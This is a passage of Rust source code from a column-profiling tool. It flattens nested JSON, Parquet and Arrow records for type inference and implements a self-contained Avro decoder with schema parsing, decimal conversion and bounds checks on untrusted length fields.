    let mut kind_counts: HashMap<JsonKind, usize> = HashMap::new();
    let mut scalar_raw: Vec<String> = Vec::new();
    let mut object_maps: Vec<&serde_json::Map<String, JsonValue>> = Vec::new();

    for v in &pool {
        match v {
            JsonValue::Object(m) => {
                *kind_counts.entry(JsonKind::Object).or_insert(0) += 1;
                object_maps.push(m);
            }
            JsonValue::Bool(b) => {
                *kind_counts.entry(JsonKind::Bool).or_insert(0) += 1;
                scalar_raw.push(b.to_string());
            }
            JsonValue::Number(n) => {
                let k = if n.is_i64() || n.is_u64() {
                    JsonKind::Integer
                } else {
                    JsonKind::Float
                };
                *kind_counts.entry(k).or_insert(0) += 1;
                scalar_raw.push(n.to_string());
            }
            JsonValue::String(s) => {
                *kind_counts.entry(JsonKind::Str).or_insert(0) += 1;
                scalar_raw.push(s.clone());
            }
            JsonValue::Null | JsonValue::Array(_) => {
                unreachable!("unwrap_arrays already removed these")
            }
        }
    }

    let (current_type, ideal_type, mut notes) = if pool.is_empty() {
        // saw_array must be true here: values was non-empty but every array found was empty.
        (
            wrap("empty"),
            wrap("empty"),
            "array is always empty - can't infer an element type".to_string(),
        )
    } else if !object_maps.is_empty() && scalar_raw.is_empty() {
        (
            wrap("object"),
            wrap("struct"),
            format!("flattened into {name}.* below"),
        )
    } else if !scalar_raw.is_empty() && object_maps.is_empty() {
        let base_current = describe_kinds(&kind_counts);
        let refs: Vec<&str> = scalar_raw.iter().map(|s| s.as_str()).collect();
        let (ideal, note) = suggest_ideal_type(&refs, &base_current);
        (wrap(&base_current), wrap(&ideal), note)
    } else {
        let base_current = describe_kinds(&kind_counts);
        let note =
            format!("mix of scalars and objects - object fields listed separately under {name}.*");
        (wrap(&base_current), wrap("String"), note)
    };

    if missing_pct > 0.0 {
        let extra = "has missing values -> wrap in Option<T> / handle nulls";
        notes = if notes.is_empty() {
            extra.to_string()
        } else {
            format!("{notes}; {extra}")
        };
    }

    let sample_pool: Vec<String> = if !scalar_raw.is_empty() {
        scalar_raw.clone()
    } else {
        object_maps
            .iter()
            .map(|m| JsonValue::Object((*m).clone()).to_string())
            .collect()
    };
    let mut seen = HashSet::new();
    let mut samples = Vec::new();
    for v in &sample_pool {
        if seen.insert(v.clone()) {
            samples.push(v.clone());
            if samples.len() >= n_samples {
                break;
            }
        }
    }

    let mut result = vec![ColumnProfile {
        name: name.clone(),
        current_type,
        ideal_type,
        description: String::new(),
        missing_pct,
        sample_values: samples,
        notes,
    }];

    if !object_maps.is_empty() {
        let mut order: Vec<String> = Vec::new();
        let mut seen_keys = HashSet::new();
        for m in &object_maps {
            for k in m.keys() {
                if seen_keys.insert(k.clone()) {
                    order.push(k.clone());
                }
            }
        }
        let child_total = object_maps.len();
        for key in order {
            let child_values: Vec<&JsonValue> = object_maps
                .iter()
                .filter_map(|m| m.get(&key))
                .filter(|v| !v.is_null())
                .collect();
            result.extend(profile_json_path(
                format!("{name}.{key}"),
                child_total,
                child_values,
                n_samples,
            ));
        }
    }

    result
}

/// Shared by any format that decodes to a list of named-field records
/// (JSON files today, Avro below) - extracts top-level columns in
/// first-seen order and profiles each, recursing into nested content.
fn profile_json_records(
    records: &[serde_json::Map<String, JsonValue>],
    n_samples: usize,
) -> Vec<ColumnProfile> {
    let total = records.len();
    let mut order: Vec<String> = Vec::new();
    let mut seen_keys = HashSet::new();
    for rec in records {
        for k in rec.keys() {
            if seen_keys.insert(k.clone()) {
                order.push(k.clone());
            }
        }
    }

    let mut out = Vec::new();
    for name in order {
        let values: Vec<&JsonValue> = records
            .iter()
            .filter_map(|r| r.get(&name))
            .filter(|v| !v.is_null())
            .collect();
        out.extend(profile_json_path(name, total, values, n_samples));
    }
    out
}

fn columns_from_json(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    let mut values = read_json_values(path)?;
    if let Some(n) = nrows {
        values.truncate(n);
    }

    if values.iter().all(JsonValue::is_object) {
        let records: Vec<serde_json::Map<String, JsonValue>> = values
            .into_iter()
            .map(|v| match v {
                JsonValue::Object(m) => m,
                _ => unreachable!("just checked every value is an object"),
            })
            .collect();
        Ok(profile_json_records(&records, n_samples))
    } else {
        // Not every top-level value/line is an object, so there's no
        // field-name-per-column shape to extract - but the values
        // themselves (scalars, or a scalar/object mix) are still a real
        // single column, profiled by the same recursive engine a nested
        // array-of-scalars sub-column already goes through. profile_json_path
        // expects nulls pre-filtered from `values` (its own recursive call
        // site does the same) - unwrap_arrays only drops nulls it finds
        // *inside* a nested array, not from this top-level list itself.
        let total = values.len();
        let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
        Ok(profile_json_path(
            "value".to_string(),
            total,
            refs,
            n_samples,
        ))
    }
}

// --- Parquet + Arrow IPC/Feather readers (opt-in via --features parquet) ---
// Both are Arrow-ecosystem formats that decode to the same RecordBatch type,
// so they share one batch-profiling function and differ only in how the
// reader is opened.

#[cfg(feature = "parquet")]
fn arrow_type_label(dt: &arrow::datatypes::DataType) -> String {
    use arrow::datatypes::DataType;
    match dt {
        DataType::Boolean => "bool".to_string(),
        DataType::Int8
        | DataType::Int16
        | DataType::Int32
        | DataType::Int64
        | DataType::UInt8
        | DataType::UInt16
        | DataType::UInt32
        | DataType::UInt64 => "i64".to_string(),
        DataType::Float16 | DataType::Float32 | DataType::Float64 => "f64".to_string(),
        DataType::Utf8 | DataType::LargeUtf8 | DataType::Utf8View => "String".to_string(),
        DataType::Date32 | DataType::Date64 => "Date".to_string(),
        DataType::Timestamp(..) => "Timestamp".to_string(),
        DataType::Decimal128(..) | DataType::Decimal256(..) => "Decimal".to_string(),
        DataType::List(_) | DataType::LargeList(_) | DataType::FixedSizeList(..) => {
            "List".to_string()
        }
        DataType::Struct(_) => "Struct".to_string(),
        DataType::Map(..) => "Map".to_string(),
        // Dictionary encoding is a storage detail (a compact index into a
        // value dictionary, typically for low-cardinality strings) - it
        // hasn't lost or changed the logical type, so report the value
        // type underneath rather than the encoding wrapping it.
        DataType::Dictionary(_, value_type) => arrow_type_label(value_type),
        other => format!("{other:?}"),
    }
}

#[cfg(feature = "parquet")]
fn is_nested_arrow_type(dt: &arrow::datatypes::DataType) -> bool {
    use arrow::datatypes::DataType;
    matches!(
        dt,
        DataType::List(_)
            | DataType::LargeList(_)
            | DataType::FixedSizeList(..)
            | DataType::Struct(_)
            | DataType::Map(..)
    )
}

/// Profiles any stream of Arrow RecordBatches sharing one schema. Scalar
/// columns are stringified directly (fast path); columns whose type is
/// Struct/List get bridged to serde_json::Value via Arrow's own JSON writer
/// and handed to the same recursive flattener used for JSON/Avro files, so
/// nesting gets identical treatment regardless of source format.
#[cfg(feature = "parquet")]
/// Converts one batch's nested columns to per-row JSON via Arrow's own
/// JSON writer. Tries the whole batch in one call first (the common, fast
/// path); if that fails - a real, encountered case being a Map column
/// with non-UTF8 keys, which the writer refuses outright regardless of
/// what every other column in the file looks like - falls back to
/// converting each nested column separately, so one column's conversion
/// failure doesn't lose every other (perfectly convertible) column in the
/// same file. A column that still fails even in isolation gets its error
/// recorded in `col_errors` rather than silently losing the column or
/// failing the whole read.
fn arrow_batch_to_json_rows(
    batch: &arrow::record_batch::RecordBatch,
    schema: &arrow::datatypes::Schema,
    nested: &[bool],
    path: &Path,
    col_errors: &mut [Option<String>],
) -> Result<Vec<serde_json::Map<String, JsonValue>>> {
    let mut writer = arrow::json::writer::ArrayWriter::new(Vec::new());
    if writer.write(batch).and_then(|()| writer.finish()).is_ok() {
        let buf = writer.into_inner();
        return serde_json::from_slice(&buf)
            .with_context(|| format!("failed parsing converted JSON for a batch in {path:?}"));
    }

    let mut rows: Vec<serde_json::Map<String, JsonValue>> =
        vec![serde_json::Map::new(); batch.num_rows()];
    for (col_idx, &is_nested) in nested.iter().enumerate() {
        if !is_nested {
            continue;
        }
        let field = schema.field(col_idx);
        let single_schema = std::sync::Arc::new(arrow::datatypes::Schema::new(vec![field.clone()]));
        let single_batch = arrow::record_batch::RecordBatch::try_new(
            single_schema,
            vec![batch.column(col_idx).clone()],
        )
        .with_context(|| format!("failed projecting column {col_idx} in {path:?}"))?;

        let mut col_writer = arrow::json::writer::ArrayWriter::new(Vec::new());
        match col_writer
            .write(&single_batch)
            .and_then(|()| col_writer.finish())
        {
            Ok(()) => {
                let buf = col_writer.into_inner();
                let col_rows: Vec<serde_json::Map<String, JsonValue>> =
                    serde_json::from_slice(&buf).with_context(|| {
                        format!("failed parsing converted JSON for a column in {path:?}")
                    })?;
                for (row, m) in rows.iter_mut().zip(col_rows) {
                    if let Some(v) = m.get(field.name()) {
                        row.insert(field.name().clone(), v.clone());
                    }
                }
            }
            Err(e) => col_errors[col_idx] = Some(e.to_string()),
        }
    }
    Ok(rows)
}

#[cfg(feature = "parquet")]
fn profile_arrow_batches(
    path: &Path,
    schema: &arrow::datatypes::Schema,
    reader: impl Iterator<
        Item = std::result::Result<arrow::record_batch::RecordBatch, arrow::error::ArrowError>,
    >,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    use arrow::util::display::array_value_to_string;

    let names: Vec<String> = schema.fields().iter().map(|f| f.name().clone()).collect();
    let nested: Vec<bool> = schema
        .fields()
        .iter()
        .map(|f| is_nested_arrow_type(f.data_type()))
        .collect();
    let type_labels: Vec<String> = schema
        .fields()
        .iter()
        .map(|f| arrow_type_label(f.data_type()))
        .collect();
    let any_nested = nested.iter().any(|&n| n);

    let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); names.len()];
    let mut nested_values: Vec<Vec<JsonValue>> = vec![Vec::new(); names.len()];
    let mut col_errors: Vec<Option<String>> = vec![None; names.len()];
    let mut rows_read = 0usize;

    'batches: for batch_result in reader {
        let batch =
            batch_result.with_context(|| format!("failed reading a batch from {path:?}"))?;

        let json_rows: Vec<serde_json::Map<String, JsonValue>> = if any_nested {
            arrow_batch_to_json_rows(&batch, schema, &nested, path, &mut col_errors)?
        } else {
            Vec::new()
        };

        for row in 0..batch.num_rows() {
            if nrows.is_some_and(|limit| rows_read >= limit) {
                break 'batches;
            }
            for (col_idx, array) in batch.columns().iter().enumerate() {
                if nested[col_idx] {
                    let found = json_rows
                        .get(row)
                        .and_then(|m| m.get(&names[col_idx]))
                        .filter(|v| !v.is_null());
                    if let Some(v) = found {
                        nested_values[col_idx].push(v.clone());
                    }
                } else {
                    let value = if array.is_null(row) {
                        None
                    } else {
                        Some(array_value_to_string(array, row).unwrap_or_default())
                    };
                    raw[col_idx].push(value);
                }
            }
            rows_read += 1;
        }
    }

    let mut out = Vec::new();
    for (i, name) in names.into_iter().enumerate() {
        if nested[i] {
            if let Some(err) = &col_errors[i] {
                // This column's nested content couldn't be converted to
                // JSON even in isolation (e.g. a Map column with non-UTF8
                // keys - a real Arrow JSON writer limitation, not
                // something this project's own code decides) - disclosed
                // rather than silently dropped or failing the whole file.
                out.push(ColumnProfile {
                    name,
                    current_type: type_labels[i].clone(),
                    ideal_type: "String".to_string(),
                    description: String::new(),
                    missing_pct: 0.0,
                    sample_values: Vec::new(),
                    notes: format!("nested content could not be converted for typing: {err}"),
                });
            } else {
                let values: Vec<&JsonValue> = nested_values[i].iter().collect();
                out.extend(profile_json_path(name, rows_read, values, n_samples));
            }
        } else {
            let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
            let col = ColumnInput {
                name,
                current_type: type_labels[i].clone(),
                raw_values: non_null,
                total: raw[i].len(),
                skip_heuristics: false,
            };
            out.push(profile_column(col, n_samples));
        }
    }
    Ok(out)
}

#[cfg(feature = "parquet")]
fn columns_from_parquet(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    use parquet::arrow::arrow_reader::ParquetRecordBatchReaderBuilder;
    use std::fs::File;

    let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
    let builder = ParquetRecordBatchReaderBuilder::try_new(file)
        .with_context(|| format!("failed to read parquet metadata from {path:?}"))?;
    let schema = builder.schema().clone();
    let reader = builder
        .build()
        .with_context(|| format!("failed to build a reader for {path:?}"))?;
    profile_arrow_batches(path, &schema, reader, nrows, n_samples)
}

#[cfg(not(feature = "parquet"))]
fn columns_from_parquet(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "Parquet support isn't compiled in - rebuild with `cargo build --release --features parquet` (or --features full)"
    )
}

#[cfg(feature = "parquet")]
fn columns_from_arrow_ipc(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    use arrow::ipc::reader::FileReader;
    use std::fs::File;

    let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
    let reader = FileReader::try_new(file, None)
        .with_context(|| format!("failed to read Arrow IPC/Feather file {path:?}"))?;
    let schema = reader.schema();
    profile_arrow_batches(path, schema.as_ref(), reader, nrows, n_samples)
}

#[cfg(not(feature = "parquet"))]
fn columns_from_arrow_ipc(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "Arrow IPC/Feather support isn't compiled in - rebuild with `cargo build --release --features parquet` (or --features full)"
    )
}

// --- Avro reader (opt-in via --features avro) ---
// Decodes each record to serde_json::Value and reuses the exact same
// column-extraction/flattening path as JSON files. The reader itself
// (`avro_support`) is hand-rolled - see CLAUDE.md's Dependency footprint
// section for why and how it was verified. Unlike every other bridge
// format in this project, decoding and JSON conversion happen in a single
// pass here rather than two (decode to a typed `Value` tree, then walk it
// alongside the schema): since the schema is already in hand at every
// step of decoding, there's no need to build an intermediate value tree
// just to co-recurse over it a second time afterward.

#[cfg(feature = "avro")]
mod avro_support {
    use super::*;
    use std::collections::HashMap;
    use std::io::Read;

    /// Matches the `apache-avro` crate's own `DEFAULT_MAX_ALLOCATION_BYTES`,
    /// guarding against a corrupted/adversarial length prefix (bytes,
    /// string, fixed) forcing a huge allocation before any real data backs
    /// it up - the same class of guard this project's other hand-rolled
    /// binary readers already apply to their own untrusted length fields.
    const MAX_ALLOC: usize = 512 * 1024 * 1024;

    fn read_u8<R: Read>(r: &mut R) -> Result<u8> {
        let mut buf = [0u8; 1];
        r.read_exact(&mut buf)
            .context("failed reading a byte from an Avro file")?;
        Ok(buf[0])
    }

    /// Reads one zigzag-encoded varint `long`, matching Avro's own
    /// encoding (verified directly against the `apache-avro` crate's own
    /// `util.rs`: a standard unsigned LEB128 varint, zigzag-decoded via
    /// `(z >> 1) ^ -(z & 1)`). Used for every `int`/`long` value, every
    /// `bytes`/`string` length prefix, every array/map block count, and
    /// every union branch index - Avro's binary encoding leans on this one
    /// primitive almost everywhere.
    fn read_zigzag<R: Read>(r: &mut R) -> Result<i64> {
        let mut n: u64 = 0;
        let mut shift = 0u32;
        loop {
            if shift > 63 {
                bail!("malformed Avro varint: too many continuation bytes");
            }
            let b = read_u8(r)?;
            n |= u64::from(b & 0x7F) << shift;
            if b & 0x80 == 0 {
                break;
            }
            shift += 7;
        }
        Ok(if n & 1 == 0 {
            (n >> 1) as i64
        } else {
            !(n >> 1) as i64
        })
    }

    /// Same as `read_zigzag`, but distinguishes "cleanly out of input right
    /// at a value boundary" (returns `Ok(None)`, the normal way an Avro
    /// Object Container File's block sequence ends - there's no sentinel
    /// value, the file just stops) from "ran out of input mid-varint"
    /// (a real truncation error). Verified against the `apache-avro`
    /// crate's own block-reading loop, which draws this exact distinction
    /// via the io error kind on the *first* byte of the next block's
    /// count.
    fn try_read_zigzag<R: Read>(r: &mut R) -> Result<Option<i64>> {
        let mut buf = [0u8; 1];
        match r.read(&mut buf) {
            Ok(0) => return Ok(None),
            Ok(_) => {}
            Err(e) => return Err(e).context("failed reading an Avro block header"),
        }
        let first = buf[0];
        if first & 0x80 == 0 {
            let n = u64::from(first);
            return Ok(Some(if n & 1 == 0 {
                (n >> 1) as i64
            } else {
                !(n >> 1) as i64
            }));
        }
        let mut n = u64::from(first & 0x7F);
        let mut shift = 7u32;
        loop {
            if shift > 63 {
                bail!("malformed Avro varint: too many continuation bytes");
            }
            let b = read_u8(r)?;
            n |= u64::from(b & 0x7F) << shift;
            if b & 0x80 == 0 {
                break;
            }
            shift += 7;
        }
        Ok(Some(if n & 1 == 0 {
            (n >> 1) as i64
        } else {
            !(n >> 1) as i64
        }))
    }

    fn read_len<R: Read>(r: &mut R) -> Result<usize> {
        let n = read_zigzag(r)?;
        let n = usize::try_from(n).with_context(|| format!("invalid Avro length {n}"))?;
        if n > MAX_ALLOC {
            bail!("Avro length {n} exceeds the sanity cap of {MAX_ALLOC} bytes");
        }
        Ok(n)
    }

    fn read_exact_vec<R: Read>(r: &mut R, n: usize) -> Result<Vec<u8>> {
        let mut buf = vec![0u8; n];
        r.read_exact(&mut buf)
            .with_context(|| format!("failed reading {n} byte(s) from an Avro file"))?;
        Ok(buf)
    }

    fn expect_bytes<R: Read>(r: &mut R, expected: &[u8]) -> Result<()> {
        let actual = read_exact_vec(r, expected.len())?;
        if actual != expected {
            bail!(
                "expected {:?} in Avro file, found {:?}",
                String::from_utf8_lossy(expected),
                String::from_utf8_lossy(&actual)
            );
        }
        Ok(())
    }

    /// `bytes`/`string` share one length-prefix-then-raw-bytes shape; only
    /// the caller-side interpretation (raw bytes vs. UTF-8) differs.
    fn read_length_prefixed<R: Read>(r: &mut R) -> Result<Vec<u8>> {
        let len = read_len(r)?;
        read_exact_vec(r, len)
    }

    #[derive(Clone, Copy)]
    enum UuidKind {
        Str,
        Bytes,
        Fixed,
    }

    /// A parsed Avro schema node. Named types (record/enum/fixed) are
    /// registered by their fully-qualified name in a flat side table as
    /// they're parsed (see `columns_from_avro`'s own `names` map) rather
    /// than embedded as shared pointers in the tree itself - a `Ref` node
    /// is just a name to look up in that table, resolved lazily at decode
    /// time. This sidesteps needing `Rc`/`RefCell` to represent a
    /// genuinely self-referential schema (a record naming itself inside
    /// one of its own fields, a real and common pattern e.g. for
    /// tree-shaped data): since a reference is never resolved *during*
    /// parsing, there's no chicken-and-egg problem to solve - the name
    /// table is simply guaranteed complete by the time decoding (which
    /// only starts after the whole schema has been parsed) ever consults
    /// it.
    #[derive(Clone)]
    enum Schema {
        Null,
        Boolean,
        Int,
        Long,
        Float,
        Double,
        Bytes,
        String,
        Array(Box<Schema>),
        Map(Box<Schema>),
        Union(Vec<Schema>),
        Record(Vec<(String, Schema)>),
        Enum(Vec<String>),
        Fixed(usize),
        /// Wraps `Bytes` or `Fixed(n)`; the `usize` is the scale.
        Decimal(Box<Schema>, usize),
        /// `apache-avro`'s own extension: an arbitrary-precision decimal
        /// whose scale is carried *in the value* rather than the schema -
        /// see `decode_big_decimal`'s own doc comment.
        BigDecimal,
        Uuid(UuidKind),
        Date,
        TimeMillis,
        TimeMicros,
        TimestampMillis,
        TimestampMicros,
        TimestampNanos,
        LocalTimestampMillis,
        LocalTimestampMicros,
        LocalTimestampNanos,
        /// Wraps `Fixed(12)`.
        Duration,
        /// A reference to a record/enum/fixed defined elsewhere in the
        /// schema, by fully-qualified name.
        Ref(String),
    }

    /// Resolves a *definition's* fully-qualified name (a record, enum, or
    /// fixed's own "name" - and, for its children, the namespace they
    /// inherit). Verified against the `apache-avro` crate's own
    /// `schema/name.rs`: a name containing a `.` is already fully
    /// qualified; otherwise an explicit `namespace` attribute on this same
    /// JSON node wins, falling back to the enclosing named type's own
    /// namespace, falling back to no namespace at all.
    fn resolve_definition_name(
        name: &str,
        own_namespace: Option<&str>,
        enclosing_namespace: Option<&str>,
    ) -> (String, Option<String>) {
        if name.contains('.') {
            let ns = name.rsplit_once('.').map(|(ns, _)| ns.to_string());
            return (name.to_string(), ns);
        }
        match own_namespace.or(enclosing_namespace) {
            Some(ns) if !ns.is_empty() => (format!("{ns}.{name}"), Some(ns.to_string())),
            _ => (name.to_string(), None),
        }
    }

    /// Resolves a bare-string *reference* to a fully-qualified name, using
    /// whatever namespace is active at the point the reference occurs in
    /// the schema tree - the same rule `resolve_definition_name` applies,
    /// minus a "own namespace" attribute (a reference is just a string,
    /// not an object with its own fields).
    fn resolve_ref_name(name: &str, enclosing_namespace: Option<&str>) -> String {
        if name.contains('.') {
            return name.to_string();
        }
        match enclosing_namespace {
            Some(ns) if !ns.is_empty() => format!("{ns}.{name}"),
            _ => name.to_string(),
        }
    }

    fn json_str<'a>(obj: &'a serde_json::Map<String, JsonValue>, key: &str) -> Option<&'a str> {
        obj.get(key).and_then(JsonValue::as_str)
    }

    /// Parses one schema node, registering any named (record/enum/fixed)
    /// definition it contains into `names` as it's encountered - in
    /// whatever order the schema happens to define them, since references
    /// are resolved lazily (see `Schema::Ref`'s own doc comment) rather
    /// than during this walk.
    fn parse_schema(
        json: &JsonValue,
        names: &mut HashMap<String, Schema>,
        enclosing_namespace: Option<&str>,
    ) -> Result<Schema> {
        match json {
            JsonValue::String(s) => Ok(match s.as_str() {
                "null" => Schema::Null,
                "boolean" => Schema::Boolean,
                "int" => Schema::Int,
                "long" => Schema::Long,
                "float" => Schema::Float,
                "double" => Schema::Double,
                "bytes" => Schema::Bytes,
                "string" => Schema::String,
                other => Schema::Ref(resolve_ref_name(other, enclosing_namespace)),
            }),
            JsonValue::Array(variants) => {
                let variants = variants
                    .iter()
                    .map(|v| parse_schema(v, names, enclosing_namespace))
                    .collect::<Result<Vec<_>>>()?;
                Ok(Schema::Union(variants))
            }
            JsonValue::Object(obj) => parse_schema_object(obj, names, enclosing_namespace),
            other => bail!("invalid Avro schema node: {other}"),
        }
    }

    fn parse_schema_object(
        obj: &serde_json::Map<String, JsonValue>,
        names: &mut HashMap<String, Schema>,
        enclosing_namespace: Option<&str>,
    ) -> Result<Schema> {
        let Some(type_field) = obj.get("type") else {
            bail!("Avro schema object is missing its \"type\" field");
        };
        // `{"type": {...}}` / `{"type": [...]}` - a nested schema value
        // rather than a plain type-name string. Real schemas rarely do
        // this, but it costs nothing extra to support via plain recursion.
        let type_name = match type_field {
            JsonValue::String(s) => s.as_str(),
            other => return parse_schema(other, names, enclosing_namespace),
        };

        match type_name {
            "record" => {
                let name = json_str(obj, "name").context("Avro record is missing \"name\"")?;
                let (fqn, child_ns) =
                    resolve_definition_name(name, json_str(obj, "namespace"), enclosing_namespace);
                let fields_json = obj
                    .get("fields")
                    .and_then(JsonValue::as_array)
                    .context("Avro record is missing \"fields\"")?;
                let mut fields = Vec::with_capacity(fields_json.len());
                for field in fields_json {
                    let field_obj = field
                        .as_object()
                        .context("Avro record field must be a JSON object")?;
                    let field_name = json_str(field_obj, "name")
                        .context("Avro record field is missing \"name\"")?
                        .to_string();
                    let field_type = field_obj
                        .get("type")
                        .context("Avro record field is missing \"type\"")?;
                    let field_schema = parse_schema(field_type, names, child_ns.as_deref())?;
                    fields.push((field_name, field_schema));
                }
                let schema = Schema::Record(fields);
                names.insert(fqn, schema.clone());
                Ok(schema)
            }
            "enum" => {
                let name = json_str(obj, "name").context("Avro enum is missing \"name\"")?;
                let (fqn, _) =
                    resolve_definition_name(name, json_str(obj, "namespace"), enclosing_namespace);
                let symbols = obj
                    .get("symbols")
                    .and_then(JsonValue::as_array)
                    .context("Avro enum is missing \"symbols\"")?
                    .iter()
                    .map(|s| {
                        s.as_str()
                            .map(str::to_string)
                            .context("Avro enum symbol must be a string")
                    })
                    .collect::<Result<Vec<_>>>()?;
                let schema = Schema::Enum(symbols);
                names.insert(fqn, schema.clone());
                Ok(schema)
            }
            "fixed" => {
                let name = json_str(obj, "name").context("Avro fixed is missing \"name\"")?;
                let (fqn, _) =
                    resolve_definition_name(name, json_str(obj, "namespace"), enclosing_namespace);
                let size = obj
                    .get("size")
                    .and_then(JsonValue::as_u64)
                    .context("Avro fixed is missing \"size\"")?;
                let size = usize::try_from(size).context("Avro fixed size out of range")?;
                if let Some(logical) = json_str(obj, "logicalType") {
                    if logical == "decimal"
                        && let Some(precision) = obj.get("precision").and_then(JsonValue::as_u64)
                    {
                        let _ = precision; // only the scale affects rendering
                        let scale = obj.get("scale").and_then(JsonValue::as_u64).unwrap_or(0);
                        let schema = Schema::Decimal(Box::new(Schema::Fixed(size)), scale as usize);
                        names.insert(fqn, Schema::Fixed(size));
                        return Ok(schema);
                    }
                    if logical == "duration" && size == 12 {
                        names.insert(fqn, Schema::Fixed(size));
                        return Ok(Schema::Duration);
                    }
                    if logical == "uuid" && size == 16 {
                        names.insert(fqn, Schema::Fixed(size));
                        return Ok(Schema::Uuid(UuidKind::Fixed));
                    }
                }
                let schema = Schema::Fixed(size);
                names.insert(fqn, schema.clone());
                Ok(schema)
            }
            "array" => {
                let items = obj
                    .get("items")
                    .context("Avro array is missing \"items\"")?;
                Ok(Schema::Array(Box::new(parse_schema(
                    items,
                    names,
                    enclosing_namespace,
                )?)))
            }
            "map" => {
                let values = obj
                    .get("values")
                    .context("Avro map is missing \"values\"")?;
                Ok(Schema::Map(Box::new(parse_schema(
                    values,
                    names,
                    enclosing_namespace,
                )?)))
            }
            // A primitive type name decorated with a "logicalType" - per
            // the Avro spec, an invalid or unrecognized logicalType (a
            // decimal on a type other than bytes/fixed, a missing required
            // attribute) falls back to the plain underlying type rather
            // than erroring.
            primitive => {
                let plain = parse_schema(
                    &JsonValue::String(primitive.to_string()),
                    names,
                    enclosing_namespace,
                )?;
                let Some(logical) = json_str(obj, "logicalType") else {
                    return Ok(plain);
                };
                Ok(match (logical, &plain) {
                    ("decimal", Schema::Bytes) => {
                        match obj.get("precision").and_then(JsonValue::as_u64) {
                            Some(_) => {
                                let scale =
                                    obj.get("scale").and_then(JsonValue::as_u64).unwrap_or(0);
                                Schema::Decimal(Box::new(Schema::Bytes), scale as usize)
                            }
                            None => plain,
                        }
                    }
                    ("big-decimal", Schema::Bytes) => Schema::BigDecimal,
                    ("uuid", Schema::String) => Schema::Uuid(UuidKind::Str),
                    ("uuid", Schema::Bytes) => Schema::Uuid(UuidKind::Bytes),
                    ("date", Schema::Int) => Schema::Date,
                    ("time-millis", Schema::Int) => Schema::TimeMillis,
                    ("time-micros", Schema::Long) => Schema::TimeMicros,
                    ("timestamp-millis", Schema::Long) => Schema::TimestampMillis,
                    ("timestamp-micros", Schema::Long) => Schema::TimestampMicros,
                    ("timestamp-nanos", Schema::Long) => Schema::TimestampNanos,
                    ("local-timestamp-millis", Schema::Long) => Schema::LocalTimestampMillis,
                    ("local-timestamp-micros", Schema::Long) => Schema::LocalTimestampMicros,
                    ("local-timestamp-nanos", Schema::Long) => Schema::LocalTimestampNanos,
                    _ => plain,
                })
            }
        }
    }

    /// Converts an arbitrary-length two's-complement big-endian byte
    /// array into a scaled decimal string, via schoolbook long division by
    /// 10 - the same numeric operation `num_bigint::BigInt`'s own
    /// `to_string` performs internally, just scoped to exactly this one
    /// conversion rather than pulling in a general bignum library for it
    /// (the same "just enough, not a general-purpose dependency"
    /// principle behind every other hand-roll in this project). `scale`
    /// can be negative (only reachable from `BigDecimal`, whose scale is
    /// carried in the value rather than fixed by the schema) - a negative
    /// scale right-pads with zeros instead of inserting a decimal point.
    pub(crate) fn bytes_to_decimal_string(bytes: &[u8], scale: i64) -> String {
        if bytes.is_empty() {
            return "0".to_string();
        }
        let negative = bytes[0] & 0x80 != 0;
        let mut magnitude: Vec<u8> = if negative {
            // Two's complement -> magnitude: invert every bit, add one.
            let mut inverted: Vec<u8> = bytes.iter().map(|b| !b).collect();
            let mut carry = 1u16;
            for byte in inverted.iter_mut().rev() {
                let sum = u16::from(*byte) + carry;
                *byte = sum as u8;
                carry = sum >> 8;
                if carry == 0 {
                    break;
                }
            }
            inverted
        } else {
            bytes.to_vec()
        };

        let mut digits = Vec::new();
        loop {
            let mut remainder = 0u32;
            let mut all_zero = true;
            for byte in &mut magnitude {
                let cur = (remainder << 8) | u32::from(*byte);
                *byte = (cur / 10) as u8;
                remainder = cur % 10;
                if *byte != 0 {
                    all_zero = false;
                }
            }
            digits.push(b'0' + remainder as u8);
            if all_zero {
                break;
            }
        }
        digits.reverse();
        let mut digits = String::from_utf8(digits).expect("ASCII digits are valid UTF-8");

        if scale > 0 {
            let scale = scale as usize;
            if digits.len() <= scale {
                digits = format!("{}{digits}", "0".repeat(scale + 1 - digits.len()));
            }
            digits.insert(digits.len() - scale, '.');
        } else if scale < 0 {
            digits.push_str(&"0".repeat((-scale) as usize));
        }
        if negative {
            digits.insert(0, '-');
        }
        digits
    }

    fn format_uuid_bytes(bytes: &[u8]) -> Option<String> {
        if bytes.len() != 16 {
            return None;
        }
        Some(format!(
            "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
            bytes[0],
            bytes[1],
            bytes[2],
            bytes[3],
            bytes[4],
            bytes[5],
            bytes[6],
            bytes[7],
            bytes[8],
            bytes[9],
            bytes[10],
            bytes[11],
            bytes[12],
            bytes[13],
            bytes[14],
            bytes[15]
        ))
    }

    /// `apache-avro`'s own extension logical type: an arbitrary-precision
    /// decimal whose scale lives *in the value* (a nested zigzag `long`
    /// after the magnitude bytes), unlike the schema-carried scale of the
    /// standard `decimal` logical type - verified against the crate's own
    /// `bigdecimal.rs`. Lower verification confidence than the rest of
    /// this reader (see CLAUDE.md): no tool available while building this
    /// project's own test fixtures can write `big-decimal` data, so this
    /// path is implemented directly from the crate's source rather than
    /// cross-checked against a real file.
    fn decode_big_decimal<R: Read>(r: &mut R) -> Result<String> {
        let outer = read_length_prefixed(r)?;
        let mut cursor: &[u8] = &outer;
        let magnitude = read_length_prefixed(&mut cursor)?;
        let scale = read_zigzag(&mut cursor)?;
        Ok(bytes_to_decimal_string(&magnitude, scale))
    }

    /// Decodes one value per `schema` and converts it directly to
